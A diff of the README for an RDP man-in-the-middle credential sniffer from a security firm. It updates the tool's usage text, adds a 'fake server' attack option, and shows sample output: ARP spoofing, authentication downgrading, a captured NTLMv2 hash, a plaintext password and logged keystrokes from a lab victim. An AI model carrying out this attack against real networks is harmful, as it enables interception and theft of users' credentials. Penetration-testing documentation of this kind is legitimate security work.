@@ -21,10 +21,10 @@ The script performs ARP spoofing to gain a Man-in-the-Middle position and
 redirects the traffic such that it runs through an RDP proxy. The proxy can
 be called separately:
 
-    $ ./rdp-cred-sniffer.py -h
-    usage: rdp-cred-sniffer.py [-h] [-d] [-p LISTEN_PORT] [-b BIND_IP]
-                               [-g {0,1,3,11}] -c CERTFILE -k KEYFILE
-                               target_host [target_port]
+    $ ./seth.py -h
+    usage: seth.py [-h] [-d] [-f] [-p LISTEN_PORT] [-b BIND_IP]
+                   [-g {0,1,3,11}] -c CERTFILE -k KEYFILE
+                   target_host [target_port]
 
     RDP credential sniffer -- Adrian Vollmer, SySS GmbH 2017
 
@@ -35,6 +35,7 @@ be called separately:
     optional arguments:
       -h, --help            show this help message and exit
       -d, --debug           show debug information
+      -f, --fake-server     perform a 'fake server' attack
       -p LISTEN_PORT, --listen-port LISTEN_PORT
                             TCP port to listen on (default 3389)
       -b BIND_IP, --bind-ip BIND_IP
@@ -74,24 +75,40 @@ the Server Windows 10.
     [*] Clone the x509 certificate of the original destination...
     [*] Adjust the iptables rule for all packets...
     [*] Run RDP proxy...
-    Connection received from 192.168.57.2
+    Listening for new connection
+    Connection received from 192.168.57.103:50431
     Downgrading authentication options from 11 to 3
     Enable SSL
     alice::avollmer-syss:1f20645749b0dfd5:b0d3d5f1642c05764ca28450f89d38db:0101000000000000b2720f48f5ded2012692fcdbf5c79a690000000002001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0001001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0004001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0003001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0007000800b2720f48f5ded20106000400020000000800300030000000000000000100000000200000413a2721a0d955c51a52d647289621706d6980bf83a5474c10d3ac02acb0105c0a0010000000000000000000000000000000000009002c005400450052004d005300520056002f003100390032002e003100360038002e00350037002e00310030003200000000000000000000000000
     Tamper with NTLM response
     TLS alert access denied, Downgrading CredSSP
-    Waiting for connection
-    Connection received from 192.168.57.2
+    Connection lost
+    Connection received from 192.168.57.103:50409
+    Listening for new connection
     Enable SSL
     Connection lost
-    Waiting for connection
-    Connection received from 192.168.57.2
+    Connection received from 192.168.57.103:50410
+    Listening for new connection
     Enable SSL
     Hiding forged protocol request from client
     .\alice:ilovebob
-    Keyboard layout/type/subtype: 0x20409/0x7/0x0
-    Key release:                 Tab
-    ^C[*] Cleaning up...
+    Keyboard Layout: 0x409 (English_United_States)
+    Key press:   LShift
+    Key press:   S
+    Key release:                 S
+    Key release:                 LShift
+    Key press:   E
+    Key release:                 E
+    Key press:   C
+    Key release:                 C
+    Key press:   R
+    Key release:                 R
+    Key press:   E
+    Key release:                 E
+    Key press:   T
+    Key release:                 T
+    Connection lost
+    [*] Cleaning up...
     [*] Done.
 
 
